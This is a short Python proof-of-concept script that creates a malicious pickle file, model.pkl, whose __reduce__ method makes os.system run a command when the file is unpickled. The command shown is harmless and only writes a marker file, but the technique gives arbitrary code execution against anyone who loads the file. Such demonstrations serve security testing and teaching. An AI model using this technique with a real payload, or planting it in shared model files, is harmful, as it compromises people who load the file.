import pickle
import os

class Malicious:
    def __reduce__(self):
        # Ensure output directory exists
        os.makedirs("output", exist_ok=True)

        # Safe, visible payload
        command = "echo MALICIOUS CODE EXECUTED > output/poc_triggered.txt"
        
        return (os.system, (command,))

# Create malicious object
malicious = Malicious()

# Save it
with open("model.pkl", "wb") as f:
    pickle.dump(malicious, f)

print("[+] Malicious pickle created")